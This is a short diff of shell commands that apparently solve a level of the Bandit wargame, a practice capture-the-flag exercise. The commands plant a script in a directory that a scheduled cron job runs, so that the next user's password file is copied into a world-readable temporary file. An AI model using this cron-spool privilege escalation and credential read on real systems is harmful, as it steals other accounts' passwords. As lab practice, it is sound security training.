@@ -1,0 +1,11 @@
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+mkdir /tmp/Level23_test/
+cd /tmp/Level23_test/
+touch password test
+chmod 777 test
+chmod 666 password
+echo "cat /etc/bandit_pass/bandit24 >> /tmp/Level23_test/password" > /tmp/Level23_test/test
+cp /tmp/Level23_test/test /var/spool/bandit24/
+(sleep...)
+cat /tmp/Level23_test/password
